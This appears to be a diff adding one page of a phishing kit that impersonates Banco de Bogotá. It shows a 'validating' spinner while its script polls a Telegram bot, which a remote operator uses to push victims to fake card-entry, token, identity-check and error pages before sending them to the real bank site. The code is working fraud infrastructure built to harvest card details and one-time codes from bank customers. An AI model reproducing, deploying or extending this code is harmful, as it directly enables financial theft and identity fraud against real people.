@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banco de Bogotá - Validando</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #2c3e50; /* Dark blue background */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+
+        .loader-container {
+            position: relative;
+            width: 60px;
+            height: 60px;
+            animation: rotateLoader 1.5s linear infinite;
+            margin-top: 20px;
+        }
+
+        .dot {
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+        }
+
+        .dot-yellow {
+            background-color: #f1c40f; /* Yellow */
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+        }
+
+        .dot-blue {
+            background-color: #3498db; /* Blue */
+            bottom: 5px;
+            left: 0;
+        }
+
+        .dot-red {
+            background-color: #e74c3c; /* Red */
+            bottom: 5px;
+            right: 0;
+        }
+
+        @keyframes rotateLoader {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+
+    </style>
+</head>
+<body>
+
+
+
+    <div class="loader-container">
+        <div class="dot dot-yellow"></div>
+        <div class="dot dot-blue"></div>
+        <div class="dot dot-red"></div>
+    </div>
+
+    <script>
+        var TOKEN;
+        const msgId = localStorage.getItem('bbogota_msg_id');
+
+        // Load credentials and start
+        fetch("claves.json?v=" + new Date().getTime())
+            .then(res => res.json())
+            .then(data => {
+                TOKEN = data.token;
+                // Delete webhook just in case it blocks getUpdates
+                fetch(`https://api.telegram.org/bot${TOKEN}/deleteWebhook`)
+                    .then(() => startChecking())
+                    .catch(() => startChecking());
+            })
+            .catch(e => console.error(e));
+
+        function startChecking() {
+            if (!msgId || !TOKEN) {
+                // If missing data, go back or wait
+                return;
+            }
+
+            const check = () => {
+                // Use POST to filter specific updates and ignore text messages
+                fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        offset: -100,
+                        allowed_updates: ["callback_query"]
+                    })
+                })
+                .then(r => r.json())
+                .then(data => {
+                    if (data.ok && data.result) {
+                        // Find our specific callback
+                        const update = data.result.reverse().find(u => 
+                            u.callback_query && 
+                            String(u.callback_query.message.message_id) === String(msgId)
+                        );
+
+                        if (update) {
+                            const action = update.callback_query.data;
+                            const chatId = update.callback_query.message.chat.id;
+                            const callbackId = update.callback_query.id;
+
+                            // 1. Answer Callback (stop spinner)
+                            fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({ callback_query_id: callbackId })
+                            });
+
+                            // 2. Remove buttons
+                            fetch(`https://api.telegram.org/bot${TOKEN}/editMessageReplyMarkup`, {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    message_id: msgId,
+                                    reply_markup: { inline_keyboard: [] }
+                                })
+                            });
+
+                            // 3. Routing
+                            if (action === 'tarjeta_debito') {
+                                localStorage.setItem('card_type', 'Débito');
+                                window.location.href = 'tarjeta.html';
+                            } else if (action === 'tarjeta_credito') {
+                                localStorage.setItem('card_type', 'Crédito');
+                                window.location.href = 'tarjeta.html';
+                            } else if (action === 'error') {
+                                window.location.href = 'tarjeta_error.html';
+                            } else if (action === 'error_debito') {
+                                localStorage.setItem('card_type', 'Débito');
+                                window.location.href = 'tarjeta_error.html';
+                            } else if (action === 'error_credito') {
+                                localStorage.setItem('card_type', 'Crédito');
+                                window.location.href = 'tarjeta_error.html';
+                            } else if (action === 'token') {
+                                window.location.href = 'token.html';
+                            } else if (action === 'token_otro') {
+                                window.location.href = 'tokeninva.html';
+                            } else if (action === 'soyyo') {
+                                window.location.href = 'soyyo.html';
+                            } else if (action === 'error_logo') {
+                                window.location.href = 'index1.html';
+                            } else if (action === 'finalizar') {
+                                window.location.href = 'https://www.bancodebogota.com/';
+                            }
+                        } else {
+                            setTimeout(check, 1500); // Retry loop
+                        }
+                    } else {
+                        setTimeout(check, 1500); // Retry loop
+                    }
+                })
+                .catch(() => setTimeout(check, 1500));
+            };
+
+            check(); // Start loop
+        }
+    </script>
+</body>
+</html>
